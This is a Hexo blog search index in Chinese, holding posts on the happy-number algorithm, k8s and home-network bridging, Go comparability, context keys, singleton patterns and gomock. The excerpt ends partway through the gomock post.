<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>又见快乐数</title>
      <link href="2021/07/20/%E5%8F%88%E8%A7%81%E5%BF%AB%E4%B9%90%E6%95%B0/"/>
      <url>2021/07/20/%E5%8F%88%E8%A7%81%E5%BF%AB%E4%B9%90%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p>水一篇再说</p><span id="more"></span><p><a href="https://leetcode-cn.com/problems/happy-number/">力扣202</a><br>这题前两年写过，当时刚接触算法，看了提示才焕然大悟，但是没有深入思考循环特征背后的数学原理，这两天刷到了，看了看题解，作者们几乎一致地是在多次各位平方和计算中确定了用循环特征判断快乐数，不同的只在做法，备忘录，双指针等。</p><p>看完题，出去散步的路上，顺便分析一下：<br>从常识上理解，在数n无限大时，数n的各位平方和是要比数n小的，因此可以粗略寻找位数的上限x, 使得位数多于等于x的数总是比其各位平方和要大<br>$a_{x}..a_{3}a_{2}a_{1} &gt; ax_{2} … a_{3}^{2} + a_{2}^{2} + a_{1}^{2}$  x&gt;=4时恒成立</p><p>不难发现，各位为9是各位平方和最大的情况 x=2时99的各位平方和为162，x=3时999个位平方和243就不够大了，但是还有部分三位数的各位平方和大于该三位数，当x=4时，四位数是绝对大于该数的各位平方和的。<br>可以推断，各位平方和比本身大的数一定小于1000</p><p>上界1000，同时各位平方和是整数，有限的，离散分布，1000以上的数的个位平方和总是小于本身 有了这些事实<br>开始讨论快乐数 非快乐数特征<br>快乐数向1收敛，非快乐数不能向1收敛，可以无穷次计算各位平方和，最后会一直在1000的正整数以内取值，假设快乐数最终不是循环的，也就是说每次的值不能跟之前相同，1000以内整数必然会被非快乐数取尽，和非快乐数的无穷性矛盾，因此非快乐数计算到后面会出现循环特征</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>k8s网络与家庭内网互通</title>
      <link href="2021/07/15/%E6%89%93%E9%80%9Ak8s%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83/"/>
      <url>2021/07/15/%E6%89%93%E9%80%9Ak8s%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<p>目前我的k8s跑在两块树莓派上，存储用的sd卡，无法保证数据安全，因此一些存储服务另跑在NAS上。那问题来了，k8s资源状态需要用prometheus存储，grafana dashboard整合，grafana好说，直接跑k8s上，但prometheus在家庭内网，k8s资源处于k8s网络中，两者并不互通，p8s想要直接进入k8s网络不太可能，目前已知有两种方案可以实现：</p><p>方案一：通过k8s apiserver</p><p>方案二：k8s node配置SNAT做跳板</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      
        <tags>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go 类型的可比较性</title>
      <link href="2021/01/22/go-%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%8F%AF%E6%AF%94%E8%BE%83%E6%80%A7/"/>
      <url>2021/01/22/go-%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%8F%AF%E6%AF%94%E8%BE%83%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<p>go内置类型都是可比较的，类型会直接比较内容，指针类型先判断指针指向地址再判断内容<br>常用复合类型的可比较性比较复杂，demo如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isComparable</span><span class="params">(a <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">    fmt.Println(reflect.ValueOf(a).Type().Comparable())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Dog <span class="keyword">struct</span> &#123;</span><br><span class="line">    name <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d Dog)</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;dog &quot;</span> + d.name + <span class="string">&quot; eat&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> Cat <span class="keyword">struct</span> &#123;</span><br><span class="line">    name <span class="keyword">string</span> </span><br><span class="line">    fur</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> fur <span class="keyword">struct</span>&#123;</span><br><span class="line">    color <span class="keyword">string</span></span><br><span class="line">    num   <span class="keyword">int64</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c Cat)</span> <span class="title">eat</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;cat &quot;</span> + c.name + <span class="string">&quot; eat&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> Animal <span class="keyword">interface</span> &#123;</span><br><span class="line">    eat()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> AnimalB <span class="keyword">interface</span> &#123;</span><br><span class="line">  eat()</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  a := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>)</span><br><span class="line">  isComparable(a)           <span class="comment">// false</span></span><br><span class="line">  </span><br><span class="line">  b := []<span class="keyword">int64</span>&#123;<span class="number">1</span>,<span class="number">2</span>&#125;</span><br><span class="line">  isComparable(a)           <span class="comment">// false</span></span><br><span class="line">  </span><br><span class="line">  c := <span class="keyword">struct</span> &#123;</span><br><span class="line">      id <span class="keyword">int</span></span><br><span class="line">      name <span class="keyword">string</span></span><br><span class="line">  &#125;&#123;</span><br><span class="line">      <span class="number">1</span>,</span><br><span class="line">      <span class="string">&quot;sc&quot;</span>,</span><br><span class="line">  &#125;</span><br><span class="line">  isComparable(c)           <span class="comment">// true</span></span><br><span class="line">  </span><br><span class="line">  d := <span class="keyword">struct</span> &#123;</span><br><span class="line">      id <span class="keyword">int</span></span><br><span class="line">      name <span class="keyword">string</span></span><br><span class="line">      clildrenId []<span class="keyword">int</span></span><br><span class="line">  &#125;&#123;</span><br><span class="line">      <span class="number">1</span>,</span><br><span class="line">      <span class="string">&quot;shanchao&quot;</span>,</span><br><span class="line">      []<span class="keyword">int</span> &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;,</span><br><span class="line">  &#125;</span><br><span class="line">  isComparable(d)            <span class="comment">// false struct内部存在不可比较类型slice</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">var</span>(</span><br><span class="line">    d1 = Dog&#123;name: <span class="string">&quot;liuyang&quot;</span>&#125;</span><br><span class="line">    d2 = Dog&#123;name: <span class="string">&quot;liuyang&quot;</span>&#125;</span><br><span class="line">    dog Animal = Dog&#123;name: <span class="string">&quot;liuyang&quot;</span>&#125;</span><br><span class="line">    dog2 Animal = Dog&#123;name: <span class="string">&quot;liuyang&quot;</span>&#125;</span><br><span class="line">    dogPtr Animal = &amp;Dog&#123;name: <span class="string">&quot;liuyang&quot;</span>&#125;</span><br><span class="line">    dogB AnimalB = Dog&#123;name: <span class="string">&quot;liuyang&quot;</span>&#125;</span><br><span class="line">    dogBPtr AnimalB = &amp;Dog&#123;name: <span class="string">&quot;liuyang&quot;</span>&#125;</span><br><span class="line">    cat Animal = Cat&#123;name: <span class="string">&quot;liuyang&quot;</span>&#125;</span><br><span class="line">    cat2  = Cat&#123;name: <span class="string">&quot;sc&quot;</span>, fur: fur&#123;color: <span class="string">&quot;yellow&quot;</span>, num: <span class="keyword">int64</span>(<span class="number">1</span>&lt;&lt;<span class="number">56</span>),&#125;,&#125;</span><br><span class="line">    cat3  = Cat&#123;name: <span class="string">&quot;sc&quot;</span>, fur: fur&#123;color: <span class="string">&quot;blue&quot;</span>, num: <span class="keyword">int64</span>(<span class="number">1</span>&lt;&lt;<span class="number">56</span>),&#125;,&#125;</span><br><span class="line">  )</span><br><span class="line">  isComparable(d)            <span class="comment">// true</span></span><br><span class="line">  isComparable(dog)          <span class="comment">// true</span></span><br><span class="line">  isComparable(dogB)         <span class="comment">// true</span></span><br><span class="line">  isComparable(cat)          <span class="comment">// true</span></span><br><span class="line">  fmt.Println(d1 == d2)      <span class="comment">// true </span></span><br><span class="line">  fmt.Println(dog == dogPtr) <span class="comment">// false</span></span><br><span class="line">  fmt.Println(dog == dog2)   <span class="comment">// true </span></span><br><span class="line">  fmt.Println(dog == dogB)   <span class="comment">// true 比较与接口无关</span></span><br><span class="line">  fmt.Println(dogPtr == dogBPtr) <span class="comment">// false 先指针指向地址是否相同</span></span><br><span class="line">  fmt.Println(dog == cat)    <span class="comment">// false 考虑了自定义类型</span></span><br><span class="line">  fmt.Println(dog == cat)    <span class="comment">// false 考虑了自定义类型</span></span><br><span class="line">  fmt.Println(cat2 == cat3)  <span class="comment">// false 递归判断</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见map, slice是不可比较的；比较interface无关；对自定义类型struct的比较先判断是否是指针，再判断属性类型、属性值，具有递归判断的性质; 嵌入不可比较类型如map slice的struct不可比较，编译会报错； </p><p>另一个有趣的点涉及到interface{}:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> myString <span class="keyword">string</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">compare</span><span class="params">(a <span class="keyword">interface</span>&#123;&#125;)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">interface</span>&#123;&#125;(<span class="string">&quot;haha&quot;</span>) == a &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> (</span><br><span class="line">        s1 = myString(<span class="string">&quot;haha&quot;</span>)</span><br><span class="line">        s2 = <span class="string">&quot;haha&quot;</span></span><br><span class="line">    )</span><br><span class="line">    fmt.Println(s1 == <span class="string">&quot;haha&quot;</span>)    <span class="comment">// true</span></span><br><span class="line">    fmt.Println(compare(s1))     <span class="comment">// false</span></span><br><span class="line">    fmt.Println(compare(s2))     <span class="comment">// true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>自定义类型与某个基础内嵌类型相同时用==不会考虑自定义的类型，而interface{}类型相互比较时，会先比较转为interface{}前的自定义类型，之后才会进行值比较。 interface{}这个特性被contex.ValueCtx用于key判断。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go context.ValueCtx的key</title>
      <link href="2021/01/22/go-context-ValueCtx%E7%9A%84key/"/>
      <url>2021/01/22/go-context-ValueCtx%E7%9A%84key/</url>
      
        <content type="html"><![CDATA[<p>golang基础</p><span id="more"></span><blockquote><p>WithValue returns a copy of parent in which the value associated with key isval. Use context Values only for request-scoped data that transits processes and APIs, not for passing optional parameters to functions. The provided key must be comparable and should not be of type string or any other built-in type to avoid collisions between packages using context. Users of WithValue should define their own types for keys. To avoid allocating when assigning to an interface{}, context keys often have concrete type struct{}. Alternatively, exported context key variables’ static type should be a pointer or interface.</p></blockquote><p>context.ValueCtx被设计用于包内函数调用链中传data的，而不是传参方式的替代。</p><p>data和参数的区别看起来并不明确，大胆猜测下：data代表上游方法调用的信息，由于上游没有处理这些data的能力（工厂方法），只能交给下游方法调用（worker/handler）去处理这些data, 常见于日志收集等操作。data意义的产生和设计模式有紧密的关系。</p><p>context.WithValue 建议使用者自己定义的unexported类型当key，目的是利用interface{}的判断特性（go 类型的可判断性）,来防止冲突，这种冲突会产生是因为ctx.Value()实现点像js原型链，key在当前ctx中未匹配，就会到父ctx去找。因为设计用于包内传data, key必须得在包内能访问，如果用string int等基础类型，会导致访问到父ctx的value，与期望不符，而使用未导出的自定义类型能防止这种向上搜索。</p><p>不能使用导出类型，只能在包内访问value, 这种软限制约束了context滥用，但要求看起来很高如果要用context跨包传递，该怎么办？（这种需求很实际，通常实现时我们不会把工厂函数和实际处理方法handler放在同一个包中，但handler需要工厂函数中的信息）</p><p>如果需要传递的信息比较重要,类型也明确，同时又不需要麻烦地创建多个key，可以把这种context当成一个工具，同时指定唯一的key：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//util/ctxutil.go</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> mycontext</span><br><span class="line"><span class="comment">// unexported, comparable</span></span><br><span class="line"><span class="keyword">var</span> key = &amp;<span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WithTags</span><span class="params">(ctx context.Context, tags <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>)</span> <span class="title">context</span>.<span class="title">Context</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ctx == <span class="literal">nil</span> &#123;</span><br><span class="line">        ctx = context.Background()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> context.WithValue(ctx, ctxMarkerKey, tags)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Extract</span><span class="params">(ctx context.Context)</span><span class="title">map</span>[<span class="title">string</span>]<span class="title">string</span></span>&#123;</span><br><span class="line">  <span class="comment">// ctx is ptr</span></span><br><span class="line">  <span class="keyword">if</span> ctx == <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> value, ok := ctx.Value(key).(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>); ok &#123;</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line">  &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      
        <tags>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go 单例设计</title>
      <link href="2021/01/22/go-%E5%8D%95%E4%BE%8B%E8%AE%BE%E8%AE%A1/"/>
      <url>2021/01/22/go-%E5%8D%95%E4%BE%8B%E8%AE%BE%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<p>水题</p><span id="more"></span><p>涉及到数据库/grpc连接的struct/class的设计，考虑单例与否尤为重要。目前我接触的项目里grpc连接通常是单例（因为http2支持多路复用，单链接可以支持并发访问），针对db的连接通常会用到xorm，xorm的engine也是单例，它会帮我们管理db连接池（应该）。进一步封装grpcClient和 xorm.Engine了的struct，实现了持久层方法的同时也得是个单例。</p><h2 id="初始化一个grpc连接"><a href="#初始化一个grpc连接" class="headerlink" title="初始化一个grpc连接"></a>初始化一个grpc连接</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//靠编译时初始化的全局变量实现的单例，同时实现并发安全+懒加载(调用时执行)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">    kratos = <span class="built_in">new</span>(kratosGRPC)</span><br><span class="line">) </span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> kratosGRPC <span class="keyword">struct</span>&#123;</span><br><span class="line">  Client kratosGrpcClient</span><br><span class="line">  mu sync.Mutex</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetClient</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> kratos.getClient()</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(k *kratosGRPC)</span><span class="title">getClient</span><span class="params">()</span>*<span class="title">kratosGrpcClient</span></span>&#123;</span><br><span class="line">  <span class="comment">// client已经被初始化</span></span><br><span class="line">  <span class="keyword">if</span> k.Client != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> k.Client</span><br><span class="line">  &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 竞争抢锁初始化client</span></span><br><span class="line">    k.mu.Lock()</span><br><span class="line">    <span class="keyword">defer</span> k.mu.Unlock()</span><br><span class="line">       <span class="comment">//  抢到锁后需要再判断</span></span><br><span class="line">       <span class="keyword">if</span> k.Client != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> k.Client</span><br><span class="line">       &#125;</span><br><span class="line">    <span class="comment">// 建立连接</span></span><br><span class="line">    k.Client = grpc.Dial(...)</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> k.client</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面是一种实现方式，当然也可以进行一些小改动，比如实现并发安全用Once.Do代替sync.Mutex。这种建立方式比较主流</p><h2 id="在某个特殊的需求下，可以这样生成单例"><a href="#在某个特殊的需求下，可以这样生成单例" class="headerlink" title="在某个特殊的需求下，可以这样生成单例"></a>在某个特殊的需求下，可以这样生成单例</h2><p>假设有个需求，经分析，要有多个job，每个job有固定的工作方式，  job需要并发处理多个task, 就把这些task交给worker, worker根据task中的数据固定调用job的方法执行。</p><p>job涉及到数据库的数据处理，所以需要提供持久层服务，该服务最终会提供handle方法做固定的工作，由于我们只需要handle方法，所以可以隐藏持久层服务，具体方法是通过工厂方法只调用一次的性质初始化一次持久层服务，将持久层服务中的handle方法交给工厂方法的返回体job实例。由于handle被引用了，所以持久层的单例没有被GC回收，job.HandleFunc还是可以使用持久层提供的数据库连接的。这样，代码逻辑中只含有job、task、work。</p><p>做法如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> HandleFunc <span class="function"><span class="keyword">func</span> <span class="params">()</span></span></span><br><span class="line"><span class="keyword">type</span> job <span class="keyword">struct</span> &#123;</span><br><span class="line">    Dsn <span class="keyword">string</span></span><br><span class="line">    TableName <span class="keyword">string</span></span><br><span class="line">    From <span class="keyword">int</span></span><br><span class="line">    To <span class="keyword">int</span></span><br><span class="line">    ConCurrentNum <span class="keyword">int</span></span><br><span class="line">    HandleFunc HandleFunc</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> RWHandler <span class="keyword">interface</span> &#123;</span><br><span class="line">    Handle()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> userDataRWHandler <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="comment">//这里含有众多处理数据库连接的handler</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> adminDataRWHandler <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="comment">//这里含有众多处理数据库连接的handler</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(handler userDataRWHandler)</span> <span class="title">Handle</span><span class="params">()</span></span>&#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;userDataRWHandler handling...&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(handler adminDataRWHandler)</span> <span class="title">Handle</span><span class="params">()</span></span>&#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;adminDataRWHandler handling...&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newUserDataHandler</span><span class="params">()</span> <span class="title">RWHandler</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &amp;userDataHandler&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newAdminDataHandler</span><span class="params">()</span> <span class="title">RWHandler</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &amp;adminDataHandler&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> Config <span class="keyword">struct</span> &#123;</span><br><span class="line">    HandlerName <span class="keyword">string</span></span><br><span class="line">    Dsn <span class="keyword">string</span></span><br><span class="line">    TableName <span class="keyword">string</span></span><br><span class="line">    From <span class="keyword">int</span></span><br><span class="line">    To <span class="keyword">int</span></span><br><span class="line">    ConCurrentNum <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newRWHandler</span><span class="params">(handlerName <span class="keyword">string</span>)</span><span class="title">RWHandler</span></span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> handlerName &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;userDataRWHandler&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> newUserDataHandler()</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;adminDataRWHandler&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> newAdminDataHandler()</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewJob</span><span class="params">(config Config)</span>*<span class="title">job</span></span>&#123;</span><br><span class="line">    handler := newRWHandler(config.HandlerName)</span><br><span class="line">    <span class="keyword">return</span> &amp;job&#123;</span><br><span class="line">        Dsn: config.Dsn,</span><br><span class="line">        TableName: config.TableName,</span><br><span class="line">        From: config.From,</span><br><span class="line">        To: config.To,</span><br><span class="line">        ConCurrentNum: config.ConCurrentNum,</span><br><span class="line">        HandleFunc: handler.Handle,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      
        <tags>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go mock 初探</title>
      <link href="2021/01/22/go-mock-%E5%88%9D%E6%8E%A2/"/>
      <url>2021/01/22/go-mock-%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<p>go mock 用于虚拟接口。一般只要提供interface，无论有没有实现该interface的类型，gomock会根据接口的输入输出提供一个实现了该interface的mock实例，同时在自定义mock实例的输入输出前，可以根据期望过滤输入，产生想要的输出或调用某些函数。说的很晦涩，看点代码吧。</p><span id="more"></span><p>目录结构：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">trymock/</span><br><span class="line">    /db</span><br><span class="line">    |--db.go</span><br><span class="line">    |--db_test.go</span><br><span class="line">    /mock</span><br><span class="line">      |--db_mock.go // generated by mockgen</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//db.go</span></span><br><span class="line"><span class="keyword">type</span> DB <span class="keyword">interface</span> &#123;</span><br><span class="line">    Get(key <span class="keyword">string</span>) (<span class="keyword">int</span>, error)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetFromDB</span><span class="params">(db DB, key <span class="keyword">string</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> value, err := db.Get(key); err == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gomock中，DB实例只能通过传参传入生成mock文件</p><figure class="highlight shell"><table><tr><td 